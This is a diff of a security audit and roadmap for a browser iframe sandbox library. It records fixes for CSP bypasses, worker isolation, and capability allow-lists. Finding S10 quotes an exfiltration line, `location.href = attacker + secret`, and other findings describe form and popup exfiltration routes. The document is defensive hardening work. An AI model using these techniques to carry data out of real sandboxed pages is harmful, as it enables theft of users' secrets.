@@ -23,24 +23,28 @@ conditional "continue".
 | Core isolation (`srcdoc` + opaque origin + immutable CSP) | ✅ implemented, `src/host.ts` |
 | CSP generation from typed config | ✅ implemented + 12 unit tests |
 | Private `MessageChannel` transport | ✅ implemented, iframe + worker |
-| Worker-mode isolation | ❌ **not real** — inherits host CSP (S1) |
-| Unit tests | 🟡 16 pass, but only `src/**` runs; `test/unit` is orphaned and red (T2) |
-| E2E tests | ❌ **all 15 specs fail** — none has run since the playground moved (T1) |
-| `bun test` / `bun run build` | ❌ both fail on paths that no longer exist (T3) |
+| Worker-mode isolation | ✅ worker spawned inside the sandbox frame (S1) |
+| Unit tests | ✅ `src/**` and `test/unit` run and pass (T2) |
+| E2E tests | ✅ e2e + research specs run on a shared harness (T1); virtual files spec is `fixme` (section C) |
+| `bun run test` / `bun run build` | ✅ both work from a clean checkout (T3) |
 | Type check | 🟡 91 errors, all in `playground/` and `sw.ts`; `src/host.ts` is clean (H3) |
-| CI | ❌ none — no `.github/` |
-| CSP delivery | 🟡 `<meta>` only — deletable by user markup, 3 directives discarded (S2, S7, S8) |
-| Default policy | ❌ `base-uri` and `form-action` unrestricted — form exfiltration verified (S9) |
+| CI | ✅ unit + build + e2e on Chromium, Firefox, WebKit (D2) |
+| CSP delivery | 🟡 `<meta>` only, now always first in `<head>` (S2 fixed); 3 directives discarded (S7, S8) |
+| Default policy | ✅ `base-uri` and `form-action` default to `'none'` (S9) |
 | Installable package | ❌ `private: true`, `main` points at a missing file (D1) |
 
-The core is in better shape than the scaffolding around it. **Nothing that verifies the security
-claims is currently running**, which is what makes section T a P0.
+*Updated after the fixes for [issue #6](https://github.com/MentalGear/web-sandbox/issues/6): milestone
+M1 plus S1, S2, S9 and the new S10–S12 are done. Items marked ✅ below keep their original text as a
+record of what was wrong.*
 
 ---
 
 ## T · Broken Foundations
 
-### T1 · The entire e2e suite is dark — **P0 · S**
+### T1 · The entire e2e suite is dark — ✅ **done**
+
+**Done**: every spec now drives `test/e2e/harness.html` through the `SandboxDriver` fixture in
+`test/e2e/fixture.ts`. The playground can move without touching the suite.
 
 Every security claim in `docs/research/` is backed by a spec in `test/e2e/`. None of them runs.
 
@@ -62,7 +66,10 @@ the specs against it, so the next playground move breaks one file instead of fif
 **Acceptance**: `bun run test:e2e` runs green; deliberately reverting a mitigation turns the
 matching `reproduce.spec.ts` red.
 
-### T2 · `test/unit` never runs, and is red when it does — **P0 · S**
+### T2 · `test/unit` never runs, and is red when it does — ✅ **done**
+
+**Done**: vitest includes `test/unit`; the test imports `ALLOWED_CAPABILITIES` from
+`@src/csp-directives`, its real home, so no new public export was added to `host.ts`.
 
 **Verified**: `test:unit` is `bun vitest --dir src`, so `test/unit/host.test.ts` is silently
 excluded. Run it directly and both cases fail: it imports `ALLOWED_CAPABILITIES` from `@src/host`,
@@ -78,7 +85,11 @@ This is the deny-list test that guards findings 01, 02 and 05 — the ones that 
 **Acceptance**: `bun run test:unit` collects both directories and is green; deleting the filter
 in `setConfig()` (`src/host.ts:70`) turns it red.
 
-### T3 · `bun test` and `bun run build` fail on stale paths — **P0 · S**
+### T3 · `bun test` and `bun run build` fail on stale paths — ✅ **done**
+
+**Done**: `bun run test` runs unit then e2e (`bun test` without `run` is Bun's own runner, so the
+README now says `bun run test`); Playwright starts Vite itself; `vite build` targets the playground;
+`build.ts` no longer copies the removed demo page.
 
 **Verified**, four dead paths:
 
@@ -113,7 +124,11 @@ preset without a spec fails a coverage assertion.
 
 ## S · Security & Correctness
 
-### S1 · Worker mode escapes the sandbox CSP — **P0 · S**
+### S1 · Worker mode escapes the sandbox CSP — ✅ **done**
+
+**Done**: worker mode now creates the sandbox frame too, and a bootstrap inside it spawns the worker
+(`src/lib/worker-bootstrap.ts`), so the worker inherits the opaque origin and the sandbox CSP. A
+timeout recreates the frame, which terminates the worker. `test/e2e/worker-security.spec.ts`.
 
 **Verified**: `spawnWorker()` builds a `blob:` URL and calls `new Worker()` on the *host* document
 (`src/host.ts:206–210`), so the worker inherits the host origin and host CSP — not the sandbox
@@ -131,7 +146,12 @@ origin and injected CSP; route the `MessagePort` handshake through the frame.
 **Acceptance**: worker-mode `fetch` to a domain absent from `connectionsAllowed` is blocked, and
 `importScripts` of an external URL fails — asserted in a *running* spec.
 
-### S2 · User markup can delete the injected CSP — **P0 · M**
+### S2 · User markup can delete the injected CSP — ✅ **done**
+
+**Done**: the security block is prepended before any user content instead of spliced into it
+(`buildGuestDocument()` in `src/lib/frame-documents.ts`). The parser ignores the user's later
+doctype and `<head>` and merges `<html>`, so the CSP meta is always the first parsed `<head>` child.
+Asserted against a hostile corpus in `frame-documents.test.ts` and in-browser by research 11.3.
 
 *Raised from P1 after [Research 11.3](research/11_meta_csp_delivery/README.md) reproduced it.*
 
@@ -241,7 +261,11 @@ for exfiltration where the URL is the payload.
 closes only under header delivery, where the policy arrives with the response carrying the content.
 Tracked as a known limitation; see [ADR-001](ADR-001-continue-or-adopt.md).
 
-### S9 · `base-uri` and `form-action` are silently unrestricted — **P0 · S**
+### S9 · `base-uri` and `form-action` are silently unrestricted — ✅ **done**
+
+**Done**: `generateCSP()` emits `'none'` for an empty directive listed in `NON_FALLBACK_DIRECTIVES`
+(`base-uri`, `form-action`). `frame-ancestors` is left out on purpose: browsers ignore it under
+`<meta>` delivery (S7). Research 12 passes.
 
 *From [Research 12](research/12_non_fallback_directives/README.md).*
 
@@ -272,6 +296,47 @@ empty non-fallback directive instead of omitting it. Default `base-uri` to `'sel
 
 **Acceptance**: `docs/research/12_non_fallback_directives/reproduce.spec.ts` passes (both cases are
 written to fail against today's code).
+
+### S10 · The guest frame can navigate itself to carry data out — ✅ **done**
+
+*From [issue #6](https://github.com/MentalGear/web-sandbox/issues/6) (N1) and
+[Research 14](research/14_self_navigation/README.md).*
+
+**Verified**: with only `allow-scripts`, `location.href = attacker + secret` sent the secret in the
+request URL. Sandbox flags stop top-level navigation, not self-navigation, and no CSP directive
+governs it.
+
+**Done**: the guest frame sits inside a library-owned wrapper frame whose policy is
+`frame-src 'none'`. The embedder's `frame-src` is checked on every navigation of a child frame,
+including ones the child starts, before the request is sent. Research 14.1 covers script, link,
+`window.open(…, '_self')` and meta refresh.
+
+**Open**: confirmed in Chromium; Firefox and WebKit are covered by CI from this change on.
+
+### S11 · A fresh port is handed to whatever document loads next — ✅ **done**
+
+*From issue #6 (N2).*
+
+**Verified**: `onload` called `setupChannel()` on every load, posting a new `MessagePort` (and queued
+`execute()` code) to `'*'`. After S10 the attacker's page received a live channel.
+
+**Done**: the channel is set up exactly once per frame. A second load closes the port, drops the
+queue, removes the frame and fires `terminated`; `execute()` is refused until the next
+`setConfig()` / `load()`. Research 14.2.
+
+### S12 · Risky capabilities are on the allow-list — ✅ **done**
+
+*From issue #6 (N3) and [Research 13](research/13_popup_exfiltration/README.md).*
+
+**Verified**: `ALLOWED_CAPABILITIES` included `allow-popups` (URL exfiltration through a new
+top-level window, which neither CSP nor the wrapper's `frame-src` covers), `allow-modals`,
+`allow-downloads` and `allow-presentation`.
+
+**Done**: split into `SAFE_CAPABILITIES` (`allow-scripts`, `allow-forms`, `allow-pointer-lock`,
+`allow-orientation-lock`) and `UNSAFE_CAPABILITIES` (popups, modals, downloads, presentation). Unsafe
+ones are dropped from `capabilities` with a warning and accepted only through `unsafeCapabilities`,
+which warns once per capability per instance. `allow-forms` stays safe: `form-action` defaults to
+`'none'` (S9) and a form submission is a navigation the wrapper blocks (S10).
 
 ## B · API Surface & DX
 
@@ -418,7 +483,10 @@ README with the real entry points.
 **Acceptance**: a packed tarball imports cleanly in a scratch project with working types, and a
 smoke test mounts a sandbox through the public entry point (with B4).
 
-### D2 · CI — **P1 · S**
+### D2 · CI — ✅ **done**
+
+**Done**: `.github/workflows/ci.yml` runs unit tests and both builds, and the e2e suite on Chromium,
+Firefox and WebKit, on push to `main` and on every PR. `tsc --noEmit` still waits on H3.
 
 **Verified**: `playwright.config.ts` defines chromium, firefox and webkit projects and
 [`BROWSER_COMPATIBILITY.md`](research/BROWSER_COMPATIBILITY.md) makes claims about all three — but
@@ -540,7 +608,7 @@ So `IMPROVEMENTS.md` is not re-proposed wholesale:
 - **CSP generation from typed config** — `src/lib/csp/csp-generator.ts`, hardened with a
   `default-src 'none'` fallback and 12 passing unit tests.
 - **Opaque origin via `srcdoc`** — closes findings 03 and 05 by construction.
-- **Headless worker mode** — API shipped; **isolation is not yet real**, see S1.
+- **Headless worker mode** — isolated inside the sandbox frame since S1.
 
 ---
 
